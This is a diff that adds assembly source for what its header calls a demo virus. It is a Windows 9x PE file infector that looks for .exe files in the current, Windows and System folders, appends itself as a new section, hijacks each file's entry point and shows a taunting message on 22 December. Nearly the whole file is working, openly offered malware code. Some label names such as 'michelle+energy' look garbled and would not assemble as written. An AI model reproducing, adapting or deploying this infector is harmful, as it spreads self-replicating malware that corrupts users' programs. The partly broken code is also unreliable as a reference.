@@ -1,0 +1,396 @@
+   ;(c) by Energy
+   ; A Demo Virus in Assembler
+   ;created for my Wife (Michelle)....
+   ;ohh, she so WonderFull..
+   ;
+   ;
+   ;------------Part One---------------------------------------------------------------------
+   ;
+   ;
+
+
+   .386
+   locals
+   michelles
+   .model flat,stdcall
+   include win32.inc
+   TRUE = 1
+   FALSE = 0
+   DEBUG =TRUE
+   L equ <LARGE>
+   extrn GetModuleHandleA : proc
+   extrn MessageBoxA : proc
+   extrn ExitProcess : proc
+   .data
+   szMsg db 'Energy are Married',0
+   szCaption db 'Message',0
+   .code
+   host_start:
+    push L 0
+    call GetModuleHandleA
+    push 1000h
+    lea eax,szCaption
+    push eax
+    lea eax,szMsg
+    push eax
+    push 0
+    call MessageBoxA
+    push L 0
+    call ExitProcess
+   ends
+   vseg segment para use32 'ENERGY'
+    assume cs : vseg
+   brigada:
+    mov ecx,ebp
+    mov edx,esp
+    call reloc
+   reloc:
+    pop ebp
+    mov eax,ebp
+    sub ebp,offset reloc
+    sub eax,reloc-brigada
+    sub eax,oldoffset[ebp]
+    mov jmpback+energy[ebp],eax
+    mov oldesp[ebp],edx
+    mov oldebp[ebp],ecx
+    mov eax,krnl32[ebp]
+    cmp dword ptr [eax],081EC8B55h
+    jnz run_host
+    lea eax,CurrentDir[ebp]
+    push eax
+    push L 256
+    call getcurrentocho
+    mov RestoreDir[ebp],eax
+    jmp start_find_file
+   Get_Window_Dir:
+    push 256
+    lea eax,Dir+energy[ebp]
+    push eax
+    call getwindowocho
+    mov windir[ebp],1
+   IF DEBUG
+    inc byte ptr Dir+energy[ebp]
+   ENDIF
+    jmp set_dir
+   Get_System_Dir:
+    push 256
+    lea eax,Dir+energy[ebp]
+    push eax
+    call getsystemocho
+    mov sysdir[ebp],1
+   IF DEBUG
+    inc byte ptr Dir+energy[ebp]
+   ENDIF
+   set_dir:
+    lea eax,Dir+energy[ebp]
+    push eax
+    call setcurrentocho
+   start_find_file:
+    lea eax,WIN32_FIND_DATA[ebp]
+    push eax
+    lea eax,findfilter[ebp]
+    push eax
+    call findfirstfile
+    mov searchhandle[ebp],eax
+    cmp eax,-1
+    jz run_host
+    jmp infectfile
+   no_aim:
+    push filehandle[ebp]
+    call closehandle
+   gonext:
+    lea eax,WIN32_FIND_DATA[ebp]
+    push eax
+    push searchhandle[ebp]
+    call findnextfile
+    or eax,eax
+    jnz infectfile
+    cmp windir[ebp],1
+    jnz Get_Window_Dir
+    cmp sysdir[ebp],1
+    jnz Get_System_Dir
+    jmp run_host
+   infectfile:
+    push 0
+    push fileattr[ebp]
+    push 3
+    push 0
+    push 0
+    push 80000000h+40000000h
+    lea eax,fullname[ebp]
+    push eax
+    call createfile
+    mov filehandle[ebp],eax
+    cmp eax,-1
+    jz gonext
+    push 0
+    push 0
+    push 3ch
+    push filehandle[ebp]
+    call setfilepointer
+    push 0
+    lea eax,bytesread[ebp]
+    push eax
+    push 4
+    lea eax,peoffset[ebp]
+    push eax
+    push filehandle[ebp]
+    call readfile
+    or eax,eax
+    jz gonext
+    push 0
+    push 0
+    push peoffset[ebp]
+    push filehandle[ebp]
+    call setfilepointer
+    push 0
+    lea eax,bytesread[ebp]
+    push eax
+    push 58h
+    lea eax,peheader[ebp]
+    push eax
+    push filehandle[ebp]
+    call readfile
+    or eax,eax
+    jz no_aim
+    cmp dword ptr peheader[ebp],4550h
+    jnz no_aim
+    cmp word ptr peheader[ebp+1ah],0AEAEh
+    jz no_aim
+    push 0
+    push 0
+    push peoffset[ebp]
+    push filehandle[ebp]
+    call setfilepointer
+    push 0
+    lea eax,bytesread[ebp]
+    push eax
+    push headersize[ebp]
+    lea eax,peheader[ebp]
+    push eax
+    push filehandle[ebp]
+    call readfile
+    or eax,eax
+    jz no_aim
+    mov word ptr peheader[ebp+1ah],0AEAEh
+    xor eax,eax
+    mov ax,NtHeaderSize[ebp]
+    add eax,18h
+    mov objtableoffset[ebp],eax
+    lea eax,peheader[ebp]
+    add objtableoffset[ebp],eax
+    xor eax,eax
+    xor edx,edx
+    mov ax,numobj[ebp]
+    mov ecx,40
+    mul ecx
+    mov esi,objtableoffset[ebp]
+    add esi,eax
+    inc word ptr numobj[ebp]
+    lea edi,newobject[ebp]
+    mov eax,[esi-40+8]
+    add eax,[esi-40+12]
+    mov ecx,objalign[ebp]
+    xor edx,edx
+    div ecx
+    inc eax
+    mul ecx
+    mov RVA[ebp],eax
+    xor edx,edx
+    mov eax,vend-brigada+1000h
+    div ecx
+    inc eax
+    mul ecx
+    mov virtualsize[ebp],eax
+    mov ecx,filealign[ebp]
+    xor edx,edx
+    mov eax,static_data_end-brigada
+    div ecx
+    inc eax
+    mul ecx
+    mov physicalsize[ebp],eax
+    mov eax,[esi-40+16]
+    add eax,[esi-40+20]
+    xor edx,edx
+    div ecx
+    inc eax
+    mul ecx
+    mov physicaloffset[ebp],eax
+    mov ecx,objalign[ebp]
+    mov eax,imagesize[ebp]
+    add eax,brigada-vend+1000h
+    div ecx
+    inc eax
+    mul ecx
+    mov imagesize[ebp],eax
+    xchg esi,edi
+    mov ecx,10
+    rep movsd
+    mov eax,RVA[ebp]
+    mov ebx,entrypointRVA[ebp]
+    mov entrypointRVA[ebp],eax
+    sub eax,ebx
+    mov oldoffset[ebp],eax
+    push 0
+    push 0
+    push peoffset[ebp]
+    push filehandle[ebp]
+    call setfilepointer
+    push 0
+    lea eax,bytesread[ebp]
+    push eax
+    push headersize[ebp]
+    lea eax,peheader[ebp]
+    push eax
+    push filehandle[ebp]
+    call writefile
+    push 0
+    push 0
+    push physicaloffset[ebp]
+    push filehandle[ebp]
+    call setfilepointer
+    push 0
+    lea eax,bytesread[ebp]
+    push eax
+    push static_data_end-brigada+1
+    lea eax,brigada[ebp]
+    push eax
+    push filehandle[ebp]
+    call writefile
+    push filehandle[ebp]
+    call closehandle
+   run_host:
+    lea eax,systime[ebp]
+    push eax
+    call gettime
+    cmp word ptr month[ebp],12
+    jnz no_trigger
+    cmp word ptr day[ebp],22
+    jnz no_trigger
+    mov eax,user[ebp]
+    cmp dword ptr [eax],08BEC8B55h
+    jnz no_trigger
+    push 1000h
+    lea eax,szvCaption[ebp]
+    push eax
+    lea eax,szvMsg[ebp]
+    push eax
+    push 0
+    call msgbox
+   no_trigger:
+    cmp RestoreDir[ebp],0
+    jz go_host
+    lea eax,CurrentDir[ebp]
+    push eax
+    call setcurrentocho
+   go_host:
+    mov eax,jmpback+energy[ebp]
+    mov esp,oldesp[ebp]
+    mov ebp,oldebp[ebp]
+    jmp eax
+   msgbox:
+    mov michelle+energy[ebp],0BFF541BAh
+    jmp michelle+energy[ebp]
+   findfirstfile:
+    mov michelle+energy[ebp],0BFF77BD7h
+    jmp michelle+energy[ebp]
+   findnextfile:
+    mov michelle+energy[ebp],0BFF77C0Fh
+    jmp michelle+energy[ebp]
+   closehandle:
+    mov michelle+energy[ebp],0BFF7E2D9h
+    jmp michelle+energy[ebp]
+   createfile:
+    mov michelle+energy[ebp],0BFF77B5Bh
+    jmp michelle+energy[ebp]
+   setfilepointer:
+    mov michelle+energy[ebp],0BFF771BBh
+    jmp michelle+energy[ebp]
+   readfile:
+    mov michelle+energy[ebp],0BFF770B9h
+    jmp michelle+energy[ebp]
+   writefile:
+    mov michelle+energy[ebp],0BFF77051h
+    jmp michelle+energy[ebp]
+   gettime:
+    mov michelle+energy[ebp],0BFFA1372h
+    jmp michelle+energy[ebp]
+   getcurrentocho:
+    mov michelle+energy[ebp],0BFF77A55h
+    jmp michelle+energy[ebp]
+   getsystemocho:
+    mov michelle+energy[ebp],0BFF779C2h
+    jmp michelle+energy[ebp]
+   getwindowocho:
+    mov michelle+energy[ebp],0BFF779F8h
+    jmp michelle+energy[ebp]
+   setcurrentocho:
+    mov michelle+energy[ebp],0BFF77A2Eh
+    jmp michelle+energy[ebp]
+   static_data_start:
+   oldoffset dd 2000h
+   jmpback+energy dd 0
+   krnl32  dd 0BFF84E4Dh
+   user  dd 0BFF53FF0h
+   findfilter db '*.exe',0
+   bytesread dd 0
+   peoffset dd 0
+   objtableoffset dd 0
+   szvCaption db 'a message for you',0
+   szvMsg  db 'Energy will die our Computer',0dh,0ah
+
+   newobject:
+    oname  db '.NET',0,0,0
+    virtualsize dd 0
+    RVA  dd 0
+    physicalsize dd 0
+    physicaloffset dd 0
+    reversed dd 0,0,0
+    objectflags db 40h,0,0,0c0h
+   static_data_end:
+   memory_data_start:
+   windir  dd 0
+   sysdir  dd 0
+   RestoreDir dd 0
+   oldesp  dd 0
+   oldebp  dd 0
+   searchhandle dd 0
+   filehandle dd 0
+   michelle+energy dd 0
+   CurrentDir db 256 dup (0)
+   Dir+energy  db 256 dup (0)
+   systime:
+    year  dw 0
+    month  dw 0
+    dayofweek dw 0
+    day  dw 0
+      dw 0,0,0,0
+   WIN32_FIND_DATA:
+    fileattr dd 0
+    createtime dd 0,0
+    lastaccesstime dd 0,0
+    lastwritetime dd 0,0
+    filesize dd 0,0
+    resv  dd 0,0
+    fullname db 256 dup (0)
+    realname db 256 dup(0)
+   peheader:
+    signature dd 0
+    cputype  dw 0
+    numobj  dw 0
+      db 3*4 dup (0)
+    NtHeaderSize dw 0
+    Flags  dw 0
+      db 4*4 dup (0)
+    entrypointRVA dd 0
+      db 3*4 dup (0)
+    objalign dd 0
+    filealign dd 0
+      db 4*4 dup (0)
+    imagesize dd 0
+    headersize dd 0
+   vend:
+    db 1000h dup(0)
+   memory_data_end:
+   ends
+    end brigada
